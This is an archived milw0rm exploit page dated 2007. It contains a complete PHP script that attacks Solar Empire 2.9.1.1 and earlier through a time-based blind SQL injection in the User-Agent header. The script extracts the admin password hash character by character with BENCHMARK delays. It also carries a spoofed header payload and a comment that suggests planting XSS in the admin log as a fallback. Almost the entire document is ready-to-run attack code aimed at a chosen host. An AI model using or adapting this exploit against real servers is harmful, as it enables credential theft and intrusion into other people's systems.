<html><head><title>Solar Empire <= 2.9.1.1 Blind SQL Injection / Hash Retrieve Exploit</title></head><pre>#!/usr/bin/php -q -d short_open_tag=on
&lt;?
echo &quot;
------------------------------------------------------------------------
Solar Empire &lt;= 2.9.1.1 Blind SQL Injection / Hash Retrieve Exploit

by BlackHawk &lt;hawkgotyou@gmail.com&gt; &lt;http://itablackhawk.altervista.org&gt;
Thanks to rgod for the php code and Marty for the Love

Special Thanks to all the guys of milw0rm IRC channel for theyr help

------------------------------------------------------------------------
&quot;;
if ($argc&lt;3) {
echo &quot;
Usage: php &quot;.$argv[0].&quot; Host Path
Host:          target server (ip/hostname)
Path:          path of revbb

Example:
php &quot;.$argv[0].&quot; localhost /solar/
&quot;;
die;
}
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
/*
This plattform is quite old, but i know that some guys tooked it for making some
indipendent project.. they may have took this bug to, so i'll ceck as soon as i
finish my last exam..

Vuln Explanation:

goto common.inc.php:

function insert_history($l_id,$i_text)
{
	global $db_name;
	if(empty($db_name)){
		$db_name = &quot;None&quot;;
	}
	dbn(&quot;insert into user_history VALUES ('$l_id','&quot;.time().&quot;','$db_name','&quot;.mysql_escape_string($i_text).&quot;','$_SERVER[REMOTE_ADDR]','$_SERVER[HTTP_USER_AGENT]')&quot;);
}

$_SERVER[HTTP_USER_AGENT] is obviously not parsed by mq, so we can perform our sql-injection attack;
Because the admin name is always the same (Admin)we will attack this username, also because there isn't any counting
of the login attempts..

WARNING:

old version of mysql may not support subquerys, so the exploit wouldn't work.
to bypass this you can exploit the game sending an XSS into the log and praying that the admin
see it..

*/
$host=$argv[1];
$path=$argv[2];

$port=80;
$proxy=&quot;&quot;;

if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$md5s[0]=0;//null
$md5s=array_merge($md5s,range(48,57)); //numbers
$md5s=array_merge($md5s,range(97,102));//a-f letters
#print_r(array_values($md5s));

$j=1;$password=&quot;&quot;;
while (!strstr($password,chr(0)))
{
for ($i=0; $i&lt;=255; $i++)
{
if (in_array($i,$md5s))
{
$starttime=time();
$sql=&quot;FuckYOU'), (1,2,3,4,5,(SELECT IF ((ASCII(SUBSTRING(se_games.admin_pw,&quot;.$j.&quot;,1))=&quot;.$i.&quot;) &amp; 1, benchmark(200000000,CHAR(0)),0) FROM se_games))/*&quot;;
$packet =&quot;POST &quot;.$p.&quot;game_listing.php HTTP/1.0\r\n&quot;;
$data=&quot;l_name=Admin&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n&quot;;
$packet.=&quot;Accept-Language: it\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;Accept-Encoding: gzip, deflate\r\n&quot;;
$packet.=&quot;CLIENT-IP: 999.999.999.999'; echo '123\r\n&quot;;//spoof
$packet.=&quot;User-Agent: $sql\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n&quot;;
$packet.=&quot;Cache-Control: no-cache\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
  //debug
  #die($html);
  sendpacketii($packet);
if (eregi(&quot;The used SELECT statements have a different number of columns&quot;,$html)){echo $html; die(&quot;\nunknown query error...&quot;);}
  $endtime=time();
  echo &quot;endtime -&gt; &quot;.$endtime.&quot;\r\n&quot;;
  $difftime=$endtime - $starttime;
  echo &quot;difftime -&gt; &quot;.$difftime.&quot;\r\n&quot;;
  if ($difftime &gt; 7) {$password.=chr($i);echo &quot;password -&gt; &quot;.$password.&quot;[???]\r\n&quot;;sleep(1);break;}
}
  if ($i==255) {die(&quot;Exploit failed...&quot;);}
  }
  $j++;
}
echo &quot;

$uname Hash is:  $password&quot;;

# Coded With BH Fast Generator v0.1
?&gt;

# milw0rm.com [2007-06-18]</pre></html>